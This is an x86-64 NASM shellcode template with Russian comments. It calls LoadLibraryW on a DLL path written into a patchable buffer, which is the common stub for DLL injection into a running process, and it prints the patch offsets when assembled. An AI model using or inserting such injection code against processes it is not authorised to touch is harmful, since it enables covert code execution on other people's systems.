BITS 64

start:
    ; Сохраняем все регистры на стеке
    push rax
    push rcx
    push rdx
    push rbx
    push rbp
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15
    
    sub rsp, 28h          ; Выравниваем стек и резервируем место
    
    ; Загружаем адрес строки (относительно текущей инструкции)
    lea rcx, [rel dll_path]
    
    ; Вызываем LoadLibraryW (адрес будет заполнен позднее)
    call [rel loadlibrary_ptr]
    
    add rsp, 28h          ; Восстанавливаем стек
    
    ; Восстанавливаем все регистры в обратном порядке
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbp
    pop rbx
    pop rdx
    pop rcx
    pop rax
    
    ret                   ; Возврат

dll_path:
    times 512 db 0       ; 512 байт нулей для записи пути DLL | 256 символов unicode

loadlibrary_ptr:
    dq 0                  ; Сюда будет записан адрес LoadLibraryW

; =============== СМЕЩЕНИЯ ===============
; Вычисляем смещения относительно начала
dll_path_offset equ dll_path - start
loadlibrary_ptr_offset equ loadlibrary_ptr - start
shellcode_size equ $ - start

; Выводим сообщения при компиляции (для NASM)
%assign __dll_offset dll_path_offset
%assign __func_offset loadlibrary_ptr_offset
%assign __size shellcode_size

%warning "dll_path offset: " __dll_offset
%warning "loadlibrary_ptr offset: " __func_offset
%warning "Total shellcode size: " __size